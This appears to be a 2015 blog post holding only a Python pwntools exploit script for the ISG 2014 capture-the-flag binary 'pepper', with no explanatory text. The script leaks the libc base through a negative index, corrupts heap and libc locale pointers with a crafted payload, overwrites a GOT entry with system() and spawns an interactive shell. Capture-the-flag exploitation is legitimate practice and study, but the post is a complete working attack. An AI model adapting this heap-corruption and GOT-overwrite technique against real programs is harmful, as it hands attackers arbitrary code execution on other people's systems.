---
layout: post
title: "isg2014-pepper-fastbinattach"
date: 2015-12-12 22:35:14 +0800
comments: true
categories: 
---
```python
#! /usr/bin/python
from pwn import *

libc = ELF('/usr/lib/libc.so.6')

p = process('./pepper')
#p = remote('192.168.56.101', 8888)

#leak
p.recvuntil('choice:')
p.sendline('2')
p.sendline('-3')
rdata = p.recvuntil('No.')
rdata = p.recv(12)
libc_base = int(rdata) & 0xffffffff - libc.symbols['__libc_start_main']
system = libc_base + libc.symbols['system']
log.info( 'libc_base: ' + hex(libc_base) )
log.info( 'system: ' + hex(system) )

#add 0
p.recvuntil('choice:')
p.sendline('4')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline('131063')
p.sendline('1')
p.sendline('1')

#add 1
p.recvuntil('choice:')
p.sendline('4')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline('18')
p.sendline('1')
p.sendline('1')

#edit 0
p.recvuntil('choice:')
p.sendline('5')
p.sendline('0')
p.sendline('1')
p.sendline('y')
p.sendline('148793')
pre = p32(0) + p32(0) + p32(0x804b0a0 + 52)
head = pre + 'a'*(131064 - len(pre))
payload  = head + 'b'*0x1000 + '\0'*0x6b4
payload += p32(0)
payload += p32(libc_base + libc.symbols['_nl_global_locale'])
payload += p32(libc_base + libc.symbols['_res@GLIBC_2.0'])
payload += p32(0)
payload += p32(libc_base + libc.symbols['_nl_C_LC_CTYPE_tolower'] + 512)
payload += p32(libc_base + libc.symbols['_nl_C_LC_CTYPE_toupper'] + 512)
payload += p32(libc_base + libc.symbols['_nl_C_LC_CTYPE_class'] + 256)
payload += p32(0)
payload += p32(0)
payload += p32(libc_base - 0x22000 + 8)
p.sendline(payload)
log.info('edit 0')

#add 2
log.info('add 2')
p.recvuntil('choice:')
p.sendline('4')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline('1')


#edit 2
log.info('edit 2')
p.sendline('5')
p.sendline('2')
p.sendline('1')
p.sendline('y')
p.sendline('32')
p.sendline(p32(0x804b02c))




#write system
log.info('edit 1')
sleep(1)
p.recvuntil('choice:')
p.sendline('5')
p.sendline('1')
p.sendline('1')
p.sendline('y')
p.sendline('32')
p.sendline(p32(system))

#shell
p.recvuntil('choice:')
p.sendline('31337')
p.sendline('sh')

p.interactive()
```
